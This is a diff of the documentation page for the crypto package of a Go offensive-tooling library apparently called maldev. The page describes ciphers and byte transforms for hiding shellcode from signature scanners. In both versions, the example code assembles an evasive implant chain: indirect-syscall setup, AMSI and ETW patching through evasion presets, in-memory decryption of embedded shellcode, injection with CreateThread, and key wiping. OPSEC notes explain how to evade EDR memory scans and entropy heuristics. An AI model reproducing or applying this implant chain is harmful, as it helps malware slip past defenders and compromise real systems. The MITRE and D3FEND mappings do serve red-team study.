@@ -1,333 +1,485 @@
-# Payload Encryption & Encoding
-
-[<- Back to Crypto Overview](README.md)
-
-**MITRE ATT&CK:** [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)
-**D3FEND:** [D3-SEA - Static Executable Analysis](https://d3fend.mitre.org/technique/d3f:StaticExecutableAnalysis/)
-
 ---
+package: github.com/oioio-space/maldev/crypto
+last_reviewed: 2026-04-27
+reflects_commit: f815d85
+---
+
+# Payload encryption & obfuscation
+
+[← crypto index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Three-tier toolkit: AEAD ciphers (AES-GCM, XChaCha20-Poly1305) for the
+outer envelope; lightweight stream/block ciphers (RC4, TEA, XTEA) for
+in-process unpackers; signature-breaking permutations (S-Box, Matrix
+Hill, ArithShift, XOR) to defeat YARA byte patterns. Pure Go, no CGo,
+cross-platform.
 
 ## Primer
 
-Shellcode and payloads contain recognizable byte patterns that antivirus engines match with signatures. If your shellcode sits in the binary as plaintext, it will be detected before it ever runs.
+Static signatures are the cheapest defender win. A raw shellcode buffer
+sitting in a binary's `.data` section gets matched by a four-byte YARA
+rule before it ever runs. Encryption breaks that match by replacing the
+plaintext with high-entropy gibberish derivable only with the key.
 
-**Putting your payload in an encrypted envelope that only you can open.** The payload is encrypted at build time with a strong algorithm (AES-256-GCM or XChaCha20). At runtime, the implant decrypts the payload in memory, injects it, and wipes the key. The binary on disk contains only encrypted gibberish -- no recognizable shellcode signatures.
+The `crypto` package layers three protection levels. The **outer
+envelope** uses an authenticated cipher (AEAD) — anything else risks an
+attacker tampering with the ciphertext to redirect execution. The
+**stream/block layer** is for tiny in-process unpackers where AES-GCM is
+overkill but a passable cipher is still wanted. The **transform layer**
+mutates byte distribution without giving cryptographic confidentiality —
+useful when the goal is breaking signatures rather than hiding intent.
 
----
+The package is pure Go, has no CGo dependencies, cross-compiles to
+Linux/Windows/macOS targets, and avoids syscalls entirely (every operation
+is a constant-time arithmetic transform on a buffer).
 
-## How It Works
-
-### Encrypt-Inject-Decrypt Flow
+## How it works
 
 ```mermaid
 flowchart LR
-    subgraph "Build Time (Operator)"
-        SC["Raw shellcode"] --> KEY["Generate key\nNewAESKey()"]
-        KEY --> ENC["EncryptAESGCM(key, shellcode)"]
-        ENC --> EMBED["Embed encrypted bytes\n+ key in binary"]
-    end
-
-    subgraph "Runtime (Target)"
-        LOAD["Load encrypted bytes"] --> DEC["DecryptAESGCM(key, ciphertext)"]
-        DEC --> INJECT["inject.Pipeline.Inject()"]
-        INJECT --> WIPE["memory.SecureZero(key)\nmemory.SecureZero(shellcode)"]
-    end
-
-    EMBED -.->|"binary on disk\n(no plaintext shellcode)"| LOAD
-
-    style ENC fill:#4a9,color:#fff
-    style DEC fill:#49a,color:#fff
-    style WIPE fill:#a94,color:#fff
+    SC[raw shellcode] -->|build time| ENC[crypto.EncryptAESGCM]
+    ENC --> STAGE1[ciphertext + nonce]
+    STAGE1 -.optional.-> WRAP[crypto.EncryptXTEA + SubstituteBytes]
+    WRAP --> EMBED[//go:embed in implant]
+    EMBED -->|runtime| LOAD[load embedded blob]
+    LOAD --> UNWRAP1[ReverseSubstituteBytes + DecryptXTEA]
+    UNWRAP1 --> DEC[crypto.DecryptAESGCM]
+    DEC --> WIPE_K[memory.SecureZero AES key]
+    WIPE_K --> EXEC[inject.Inject]
+    EXEC --> WIPE_P[memory.SecureZero plaintext]
 ```
 
-### Algorithm Comparison
+Build-time: encrypt with AEAD, optionally wrap in cheaper layers.
+Runtime: peel layers in reverse, wipe the key the moment the AEAD `Open`
+returns, inject, wipe the plaintext.
 
-```mermaid
-flowchart TD
-    START["Choose encryption"] --> Q1{"Need\ncryptographic\nsecurity?"}
-
-    Q1 -->|Yes| Q2{"AES-NI\navailable?"}
-    Q2 -->|"Yes (x86)"| AES["AES-256-GCM\nFastest on modern CPUs\nAuthenticated encryption"]
-    Q2 -->|"No (ARM, old CPU)"| CHACHA["XChaCha20-Poly1305\nFast without hardware support\nAuthenticated encryption"]
-
-    Q1 -->|"No, just obfuscation"| Q3{"Compatibility\nrequired?"}
-    Q3 -->|"Yes (legacy tools)"| RC4["RC4\nWARNING: cryptographically broken\nCompatibility only"]
-    Q3 -->|No| XOR["XOR with repeating key\nSimplest obfuscation\nNot cryptographic"]
-
-    style AES fill:#4a9,color:#fff
-    style CHACHA fill:#49a,color:#fff
-    style XOR fill:#a94,color:#fff
-    style RC4 fill:#f66,color:#fff
-```
-
-### AES-256-GCM Internals
+### AES-GCM internals
 
 ```mermaid
 sequenceDiagram
-    participant App as Application
-    participant Crypto as crypto package
-    participant Stdlib as Go crypto/aes + cipher
+    participant App as Implant
+    participant Pkg as crypto
+    participant Std as crypto/aes + cipher
 
-    Note over App: Encryption
-    App->>Crypto: EncryptAESGCM(key, plaintext)
-    Crypto->>Stdlib: aes.NewCipher(key) [32 bytes]
-    Crypto->>Stdlib: cipher.NewGCM(block)
-    Crypto->>Stdlib: io.ReadFull(crypto/rand, nonce) [12 bytes]
-    Crypto->>Stdlib: gcm.Seal(nonce, nonce, plaintext, nil)
-    Stdlib-->>Crypto: [nonce || ciphertext || tag]
-    Crypto-->>App: Combined output
+    App->>Pkg: EncryptAESGCM(key, plaintext)
+    Pkg->>Std: aes.NewCipher(key)  [32 bytes]
+    Pkg->>Std: cipher.NewGCM(block)
+    Pkg->>Std: rand.Read(nonce)    [12 bytes]
+    Pkg->>Std: gcm.Seal(nonce, nonce, plaintext, nil)
+    Std-->>Pkg: nonce ‖ ciphertext ‖ tag
+    Pkg-->>App: combined output
 
-    Note over App: Decryption
-    App->>Crypto: DecryptAESGCM(key, combined)
-    Crypto->>Crypto: Split: nonce = combined[:12]
-    Crypto->>Stdlib: gcm.Open(nil, nonce, ciphertext, nil)
-    Note over Stdlib: Verifies authentication tag
-    Stdlib-->>Crypto: plaintext (or error if tampered)
-    Crypto-->>App: Decrypted payload
+    App->>Pkg: DecryptAESGCM(key, combined)
+    Pkg->>Pkg: nonce = combined[:12]
+    Pkg->>Std: gcm.Open(nil, nonce, rest, nil)
+    Note over Std: Verifies the 16-byte tag<br/>before returning plaintext
+    Std-->>Pkg: plaintext or ErrAuthFailed
+    Pkg-->>App: plaintext
 ```
 
----
+The 12-byte random nonce is **prepended** to the output, so callers do
+not manage nonces. Re-encrypting the same plaintext yields a different
+ciphertext every time.
 
-## Usage
+### TEA / XTEA round equation
 
-### AES-256-GCM (Recommended)
+64 rounds, 32-bit half-blocks, 128-bit key:
+
+$$
+\begin{aligned}
+\text{sum} &\mathrel{+}= \delta \\
+v_0 &\mathrel{+}= ((v_1 \ll 4) + k_0) \oplus (v_1 + \text{sum}) \oplus ((v_1 \gg 5) + k_1) \\
+v_1 &\mathrel{+}= ((v_0 \ll 4) + k_2) \oplus (v_0 + \text{sum}) \oplus ((v_0 \gg 5) + k_3)
+\end{aligned}
+$$
+
+with $\delta = \texttt{0x9E3779B9}$ (golden ratio constant). XTEA fixes
+TEA's equivalent-key weakness by mixing the round counter into the key
+schedule, but the structure is the same.
+
+### Matrix (Hill cipher mod 256)
+
+For an $n \times n$ key matrix $K$ over $\mathbb{Z}_{256}$ with
+$\gcd(\det K, 256) = 1$, encryption operates per $n$-byte block $\vec{p}$:
+
+$$
+\vec{c} = K \vec{p} \mod 256
+$$
+
+`NewMatrixKey(n)` searches random matrices until one is invertible mod
+256. The inverse is precomputed and returned alongside.
+
+## API Reference
+
+### `NewAESKey() ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#NewAESKey)
+
+Generate a fresh 32-byte AES-256 key from `crypto/rand`.
+
+**Returns:**
+- `[]byte` — 32 random bytes suitable as input to `EncryptAESGCM`.
+- `error` — wraps `crypto/rand` failure (extremely rare, OS entropy
+  exhaustion).
+
+**Side effects:** none — pure call into the OS CSPRNG.
+
+**OPSEC:** invisible. Reads `RtlGenRandom` / `BCryptGenRandom` on Windows.
+
+### `EncryptAESGCM(key, plaintext []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#EncryptAESGCM)
+
+AES-256-GCM AEAD encryption with a fresh random 12-byte nonce.
+
+**Parameters:**
+- `key` — 32 bytes (AES-256). Shorter or longer keys return an error.
+- `plaintext` — payload to encrypt; any length, including zero.
+
+**Returns:**
+- `[]byte` — `nonce ‖ ciphertext ‖ tag` (12 + len(plaintext) + 16 bytes).
+- `error` — invalid key length or `crypto/rand` failure.
+
+**Side effects:** allocates `len(plaintext) + 28` bytes.
+
+**OPSEC:** very-quiet. Pure userland arithmetic.
+
+### `DecryptAESGCM(key, ciphertext []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#DecryptAESGCM)
+
+Inverse of `EncryptAESGCM`. Extracts the prepended nonce, verifies the
+GCM tag, returns the plaintext.
+
+**Parameters:**
+- `key` — same 32-byte key used to encrypt.
+- `ciphertext` — output of `EncryptAESGCM` (must be at least 28 bytes).
+
+**Returns:**
+- `[]byte` — original plaintext.
+- `error` — invalid key length, ciphertext too short, or
+  authentication-tag failure (tampering or wrong key).
+
+### `NewChaCha20Key() ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#NewChaCha20Key)
+
+Generate a fresh 32-byte XChaCha20-Poly1305 key.
+
+### `EncryptChaCha20(key, plaintext []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#EncryptChaCha20)
+
+XChaCha20-Poly1305 AEAD encryption with a fresh random 24-byte nonce.
+
+**Parameters:** `key` 32 bytes; `plaintext` any length.
+
+**Returns:** `nonce ‖ ciphertext ‖ tag` (24 + len(plaintext) + 16 bytes).
+
+**OPSEC:** very-quiet. Prefer over AES-GCM on targets without AES-NI
+(older CPUs, ARM) — pure ChaCha20 is faster there.
+
+### `DecryptChaCha20(key, ciphertext []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#DecryptChaCha20)
+
+Inverse of `EncryptChaCha20`.
+
+### `EncryptRC4(key, data []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#EncryptRC4)
+
+RC4 stream cipher. Symmetric — call again to decrypt.
+
+> [!CAUTION]
+> RC4 is cryptographically broken (biased keystream, related-key
+> attacks). The only legitimate use case in this package is matching
+> Metasploit's `rc4` payload format on the handler side.
+
+**Parameters:** `key` 1–256 bytes; `data` any length.
+
+**Returns:** XORed buffer (same length as input).
+
+### `XORWithRepeatingKey(data, key []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#XORWithRepeatingKey)
+
+XOR each byte of `data` with the cyclic key. Symmetric.
+
+**Parameters:** `data` any length; `key` ≥ 1 byte (zero-length returns an
+error).
+
+**Returns:** XORed buffer.
+
+**OPSEC:** very-quiet but trivially reversible if any plaintext is
+known. Use only as a layer atop an AEAD.
+
+### `EncryptTEA(key [16]byte, data []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#EncryptTEA)
+
+TEA block cipher (8-byte block, 64 rounds). PKCS#7-padded.
+
+**Parameters:** `key` exactly 16 bytes; `data` any length (padded
+internally).
+
+**Returns:** ciphertext, length rounded up to the next multiple of 8.
+
+> [!WARNING]
+> TEA has an equivalent-key weakness — every key has three "siblings"
+> that produce the same ciphertext. Prefer XTEA for new code.
+
+### `DecryptTEA(key [16]byte, data []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#DecryptTEA)
+
+Inverse of `EncryptTEA`. Strips PKCS#7 padding.
+
+### `EncryptXTEA(key [16]byte, data []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#EncryptXTEA)
+
+XTEA block cipher — TEA with a fixed key schedule. Same block size and
+round count.
+
+### `DecryptXTEA(key [16]byte, data []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#DecryptXTEA)
+
+Inverse of `EncryptXTEA`.
+
+### `NewSBox() (sbox [256]byte, inverse [256]byte, err error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#NewSBox)
+
+Generate a random byte permutation and its inverse. Use as a non-linear
+mixing layer between cryptographic stages.
+
+**Returns:** the forward and inverse permutation tables, plus
+`crypto/rand` errors.
+
+### `SubstituteBytes(data []byte, sbox [256]byte) []byte`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#SubstituteBytes)
+
+Apply the S-Box byte-by-byte. Pair with `ReverseSubstituteBytes` to undo.
+
+### `ReverseSubstituteBytes(data []byte, inverse [256]byte) []byte`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#ReverseSubstituteBytes)
+
+Inverse of `SubstituteBytes`.
+
+### `NewMatrixKey(n int) (key, inverse [][]byte, err error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#NewMatrixKey)
+
+Generate a random invertible $n \times n$ matrix mod 256. Searches until
+$\gcd(\det K, 256) = 1$.
+
+**Parameters:** `n` ∈ {2, 3, 4}.
+
+**Returns:** key matrix, inverse matrix, `error` for invalid `n` or
+search exhaustion.
+
+### `MatrixTransform(data []byte, key [][]byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#MatrixTransform)
+
+Hill-cipher block transform mod 256. Each $n$-byte block becomes
+$K\vec{p} \mod 256$. PKCS#7-padded.
+
+### `ReverseMatrixTransform(data []byte, inverse [][]byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#ReverseMatrixTransform)
+
+Inverse Hill-cipher transform.
+
+### `ArithShift(data, key []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#ArithShift)
+
+Position-dependent byte add (mod 256). Adds `key[i % len(key)] + i` to
+each byte. Defeats simple frequency analysis that XOR doesn't.
+
+### `ReverseArithShift(data, key []byte) ([]byte, error)`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/crypto#ReverseArithShift)
+
+Inverse of `ArithShift`.
+
+## Examples
+
+### Simple
 
 ```go
-import "github.com/oioio-space/maldev/crypto"
-
-// Generate a random 32-byte key
 key, _ := crypto.NewAESKey()
-
-// Encrypt (nonce is prepended automatically)
-shellcode := []byte{0x48, 0x31, 0xc0, /* ... */}
-encrypted, _ := crypto.EncryptAESGCM(key, shellcode)
-
-// Decrypt
-decrypted, _ := crypto.DecryptAESGCM(key, encrypted)
+ct, _ := crypto.EncryptAESGCM(key, []byte("shellcode goes here"))
+pt, _ := crypto.DecryptAESGCM(key, ct)
 ```
 
-### XChaCha20-Poly1305
+See `ExampleEncryptAESGCM` and `ExampleEncryptChaCha20` in
+[`crypto_example_test.go`](../../../crypto/crypto_example_test.go) for
+runnable variants.
+
+### Composed (with `cleanup/memory` for key wiping)
+
+Decrypt the embedded blob, wipe the key the moment `Open` returns, run
+the payload, wipe the plaintext:
+
+```go
+import (
+    "github.com/oioio-space/maldev/cleanup/memory"
+    "github.com/oioio-space/maldev/crypto"
+)
+
+shellcode, err := crypto.DecryptAESGCM(aesKey, encryptedPayload)
+if err != nil {
+    return err
+}
+memory.SecureZero(aesKey)
+
+// ... use shellcode ...
+memory.SecureZero(shellcode)
+```
+
+### Advanced (XTEA + S-Box layered packer)
+
+A two-stage in-process unpacker. The outer S-Box defeats YARA rules that
+look at byte distribution; the inner XTEA round destroys whatever
+structure leaks through.
 
 ```go
 import "github.com/oioio-space/maldev/crypto"
 
-key, _ := crypto.NewChaCha20Key() // 32 bytes
+// Build time
+var xteaKey [16]byte
+_, _ = crypto.NewSBox() // warm CSPRNG
+sbox, inv, _ := crypto.NewSBox()
+copy(xteaKey[:], aesKeyMaterial[:16])
 
-encrypted, _ := crypto.EncryptChaCha20(key, shellcode)
-decrypted, _ := crypto.DecryptChaCha20(key, encrypted)
+stage1, _ := crypto.EncryptXTEA(xteaKey, shellcode)
+packed   := crypto.SubstituteBytes(stage1, sbox)
+
+// Embed `packed` + `xteaKey` + `inv` in the implant.
+
+// Runtime
+unsbox  := crypto.ReverseSubstituteBytes(packed, inv)
+orig, _ := crypto.DecryptXTEA(xteaKey, unsbox)
 ```
 
-### XOR Obfuscation
+### Complex (full encrypt → evade → inject → wipe chain)
+
+End-to-end implant body. Apply syscall evasion first, decrypt the
+payload, wipe the key, inject through an indirect-syscall caller, wipe
+the plaintext.
 
 ```go
-import "github.com/oioio-space/maldev/crypto"
-
-xorKey := []byte("my-xor-key")
-
-// XOR is symmetric: encrypt and decrypt are the same operation
-obfuscated, _ := crypto.XORWithRepeatingKey(shellcode, xorKey)
-deobfuscated, _ := crypto.XORWithRepeatingKey(obfuscated, xorKey)
-```
-
-### RC4 (Legacy Compatibility)
-
-```go
-import "github.com/oioio-space/maldev/crypto"
-
-// WARNING: RC4 is cryptographically broken. Use for compatibility only.
-rc4Key := []byte("rc4-key")
-encrypted, _ := crypto.EncryptRC4(rc4Key, shellcode)
-decrypted, _ := crypto.EncryptRC4(rc4Key, encrypted) // symmetric
-```
-
-### Base64 Encoding
-
-```go
-import "github.com/oioio-space/maldev/encode"
-
-encoded := encode.Base64Encode(shellcode)
-decoded, _ := encode.Base64Decode(encoded)
-
-// URL-safe variant
-urlEncoded := encode.Base64URLEncode(shellcode)
-urlDecoded, _ := encode.Base64URLDecode(urlEncoded)
-```
-
-### ROT13 String Obfuscation
-
-```go
-import "github.com/oioio-space/maldev/encode"
-
-obfuscated := encode.ROT13("NtAllocateVirtualMemory")
-// "AgNyybpngrIveghnlZrzbel"
-
-original := encode.ROT13(obfuscated)
-// "NtAllocateVirtualMemory"
-```
-
-### PowerShell Encoding
-
-```go
-import "github.com/oioio-space/maldev/encode"
-
-// Encode a PowerShell script as Base64 UTF-16LE (for powershell -EncodedCommand)
-encoded := encode.PowerShell("Write-Host 'Hello'")
-// Can be run as: powershell -EncodedCommand <encoded>
-```
-
----
-
-## Combined Example: Encrypt, Inject, Wipe
-
-```go
-package main
-
 import (
     "github.com/oioio-space/maldev/cleanup/memory"
     "github.com/oioio-space/maldev/crypto"
     "github.com/oioio-space/maldev/evasion"
-    "github.com/oioio-space/maldev/evasion/amsi"
-    "github.com/oioio-space/maldev/evasion/etw"
+    "github.com/oioio-space/maldev/evasion/preset"
     "github.com/oioio-space/maldev/inject"
     wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
-// Embedded at build time (encrypted shellcode + key)
 var (
-    encryptedPayload = []byte{/* output of EncryptAESGCM */}
-    aesKey           = []byte{/* 32-byte key */}
+    encrypted []byte // //go:embed payload.aes
+    aesKey    []byte // //go:embed key.bin
 )
 
-func main() {
-    // 1. Set up indirect syscalls
+func run() error {
     caller := wsyscall.New(wsyscall.MethodIndirect,
-        wsyscall.Chain(wsyscall.NewTartarus(), wsyscall.NewHalosGate()),
-    )
-    defer caller.Close()
+        wsyscall.Chain(wsyscall.NewHellsGate(), wsyscall.NewHalosGate()))
+    _ = evasion.ApplyAll(preset.Stealth(), caller)
 
-    // 2. Apply evasion
-    evasion.ApplyAll([]evasion.Technique{amsi.ScanBufferPatch(), etw.All()}, caller)
-
-    // 3. Decrypt payload in memory
-    shellcode, err := crypto.DecryptAESGCM(aesKey, encryptedPayload)
+    shellcode, err := crypto.DecryptAESGCM(aesKey, encrypted)
     if err != nil {
-        panic("decryption failed -- payload tampered?")
+        return err
     }
-
-    // 4. Wipe the key immediately
     memory.SecureZero(aesKey)
 
-    // 5. Inject shellcode via the indirect-syscall caller chain.
     inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
         Config:        inject.Config{Method: inject.MethodCreateThread},
         SyscallMethod: wsyscall.MethodIndirect,
     })
-    if err != nil { panic(err) }
-    if err := inj.Inject(shellcode); err != nil { panic(err) }
-
-    // 6. Wipe decrypted shellcode from Go heap
+    if err != nil {
+        return err
+    }
+    if err := inj.Inject(shellcode); err != nil {
+        return err
+    }
     memory.SecureZero(shellcode)
+    return nil
 }
 ```
 
----
+## OPSEC & Detection
 
-## Advantages & Limitations
+| Artefact | Where defenders look |
+|---|---|
+| High-entropy `.data` / `.rdata` section | Compile-time YARA `entropy >= 7.5`, ML classifiers (PE byte histograms) |
+| Decrypt routine signature | Static unpacker fingerprints (e.g. `aes.NewCipher` followed by `cipher.NewGCM` from a non-go-tooling-built binary) |
+| Plaintext shellcode in process memory after decrypt | EDR memory scans (Defender's `AMSI`-like for native code, MDE Live Response) |
+| Long-lived AES key in heap | YARA scanning of process RWX/RW pages — wipe immediately after `Open` |
 
-### Advantages
+**D3FEND counters:**
 
-- **Authenticated encryption**: AES-GCM and ChaCha20-Poly1305 detect tampering (integrity + confidentiality)
-- **Random nonces**: Nonces are generated from `crypto/rand` and prepended to ciphertext -- no nonce management needed
-- **Key generation helpers**: `NewAESKey()` and `NewChaCha20Key()` produce proper random keys
-- **Multiple tiers**: From cryptographic (AES/ChaCha20) to obfuscation (XOR) to encoding (Base64)
-- **Pure Go**: No CGo dependencies, works with cross-compilation
+- [D3-SEA](https://d3fend.mitre.org/technique/d3f:StaticExecutableAnalysis/)
+  — static executable analysis defeats high-entropy sections via
+  unpacker emulation.
+- [D3-PSA](https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/)
+  — process-spawn analysis catches decrypt-then-execute patterns.
+- [D3-FCR](https://d3fend.mitre.org/technique/d3f:FileContentRules/) —
+  YARA over `.data` after unpacker emulation.
 
-### Limitations
+**Hardening:** wipe keys before injection (`cleanup/memory.SecureZero`);
+chunk decryption + injection across cache lines so plaintext does not
+sit in RWX longer than a few microseconds; pair with sleep-masking
+(`evasion/sleepmask`) for long-running implants.
 
-- **Key distribution**: The key must reach the implant somehow -- embedded in binary, derived from environment, or fetched from C2
-- **Entropy detection**: Encrypted payloads have high entropy, which heuristic scanners flag
-- **XOR is trivially breakable**: Known-plaintext attacks recover the key if any ciphertext byte is known
-- **RC4 is broken**: Stream cipher with known biases -- use only for legacy Metasploit compatibility
-- **No key derivation**: No built-in KDF -- if using passwords, derive keys with Argon2/PBKDF2 externally
+## MITRE ATT&CK
 
----
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | obfuscation transforms (XOR, TEA, S-Box, Matrix, ArithShift) | D3-SEA |
+| [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Encrypted/Encoded File | AEAD ciphers (AES-GCM, ChaCha20) and stream cipher (RC4) | D3-FCR |
 
-## Lightweight Obfuscation
+## Limitations
 
-When the goal is not confidentiality but **breaking signatures and static analysis**, cryptographic primitives are overkill. Five lightweight obfuscations ship alongside the full ciphers for layered shellcode packers and small-footprint stages.
+- **Key distribution unsolved.** This package does not embed, derive,
+  fetch, or rotate keys — it ciphers buffers. A real implant must source
+  the key from somewhere (build-time embed, environment, C2 fetch). The
+  weakest link in any payload-encryption design.
+- **Entropy is detectable.** A 200 KB high-entropy section in a Go
+  binary is suspicious by itself. Layer with non-uniform transforms
+  (`ArithShift`) or split into multiple sections for cover.
+- **Ephemeral plaintext still touchable.** Between decrypt and `Inject`,
+  the plaintext lives on the Go heap. EDR memory scans (Defender,
+  CrowdStrike) sweep RW pages — wipe the buffer *before* the next
+  syscall, not after.
+- **No streaming API.** Every function takes the whole buffer. For
+  multi-MB payloads, allocate carefully — `EncryptAESGCM` allocates
+  exactly once, but `MatrixTransform` allocates intermediate row
+  vectors.
+- **RC4 broken.** Compatibility-only; do not use as the outer envelope.
+- **TEA equivalent keys.** Three keys decrypt to the same plaintext;
+  prefer XTEA.
 
-| Algorithm | Block / Keyspace | Roundtrip | When to use |
-|-----------|------------------|-----------|-------------|
-| **TEA**   | 8-byte block / 16-byte key / 64 rounds | `EncryptTEA` / `DecryptTEA` | Minimal footprint (~60 instructions), academic-weak — first obfuscation layer only |
-| **XTEA**  | 8-byte block / 16-byte key / 64 rounds | `EncryptXTEA` / `DecryptXTEA` | Drop-in TEA replacement — fixes TEA's equivalent-key weakness |
-| **ArithShift** | arbitrary / any key length | `ArithShift` / `ReverseArithShift` | Position-dependent byte shift — breaks frequency analysis unlike XOR |
-| **S-Box** | 256-byte permutation | `SubstituteBytes` / `ReverseSubstituteBytes` | Non-linear byte substitution layer |
-| **MatrixTransform** (Agent Smith) | n×n mod-256 Hill cipher, n∈{2,3,4} | `MatrixTransform` / `ReverseMatrixTransform` | Diffuses each byte across a block — destroys byte-granularity pattern matching |
+## See also
 
-**None of these are cryptographically secure.** Use them as layers on top of AES/ChaCha20 to defeat signatures, not as the outer envelope.
-
-```go
-// Example: XTEA + S-Box layering for shellcode packing.
-var xteaKey [16]byte
-rand.Read(xteaKey[:])
-sbox, inv, _ := crypto.NewSBox()
-
-packed, _  := crypto.EncryptXTEA(xteaKey, shellcode)
-packed     = crypto.SubstituteBytes(packed, sbox)
-
-// At runtime (in-process):
-stage1 := crypto.ReverseSubstituteBytes(packed, inv)
-orig, _ := crypto.DecryptXTEA(xteaKey, stage1)
-```
-
-**MITRE ATT&CK:** T1027 — Obfuscated Files or Information
-
----
-
-## API Reference
-
-### crypto/
-
-```go
-// AES-256-GCM
-func NewAESKey() ([]byte, error)
-func EncryptAESGCM(key, plaintext []byte) ([]byte, error)
-func DecryptAESGCM(key, ciphertext []byte) ([]byte, error)
-
-// XChaCha20-Poly1305
-func NewChaCha20Key() ([]byte, error)
-func EncryptChaCha20(key, plaintext []byte) ([]byte, error)
-func DecryptChaCha20(key, ciphertext []byte) ([]byte, error)
-
-// XOR
-func XORWithRepeatingKey(data, key []byte) ([]byte, error)
-
-// RC4 (WARNING: cryptographically broken)
-func EncryptRC4(key, data []byte) ([]byte, error)
-
-// Lightweight obfuscation (not cryptographic)
-func EncryptTEA(key [16]byte, data []byte) ([]byte, error)
-func DecryptTEA(key [16]byte, data []byte) ([]byte, error)
-func EncryptXTEA(key [16]byte, data []byte) ([]byte, error)
-func DecryptXTEA(key [16]byte, data []byte) ([]byte, error)
-func ArithShift(data, key []byte) ([]byte, error)
-func ReverseArithShift(data, key []byte) ([]byte, error)
-func NewSBox() (sbox [256]byte, inverse [256]byte, err error)
-func SubstituteBytes(data []byte, sbox [256]byte) []byte
-func ReverseSubstituteBytes(data []byte, inverse [256]byte) []byte
-func NewMatrixKey(n int) (key [][]byte, inverse [][]byte, err error)
-func MatrixTransform(data []byte, key [][]byte) ([]byte, error)
-func ReverseMatrixTransform(data []byte, inverse [][]byte) ([]byte, error)
-```
-
-### encode/
-
-```go
-func Base64Encode(data []byte) string
-func Base64Decode(s string) ([]byte, error)
-func Base64URLEncode(data []byte) string
-func Base64URLDecode(data string) ([]byte, error)
-func ROT13(s string) string
-func ToUTF16LE(s string) []byte
-func PowerShell(script string) string
-```
+- [`encode`](../encode/README.md) — transport-safe representations to
+  wrap the ciphertext for HTTP / PowerShell / JSON channels.
+- [`hash`](../hash/README.md) — integrity, ROR13 API hashing, fuzzy
+  similarity for variant detection.
+- [`cleanup/memory.SecureZero`](../cleanup/memory-wipe.md) — pair to
+  wipe keys and plaintext.
+- [`evasion/sleepmask`](../evasion/sleep-mask.md) — re-encrypt the
+  payload during sleep windows.
+- [Bernstein, *ChaCha, a variant of Salsa20*](https://cr.yp.to/chacha/chacha-20080128.pdf)
+  — XChaCha20-Poly1305 source paper.
+- [NIST SP 800-38D](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
+  — GCM specification.
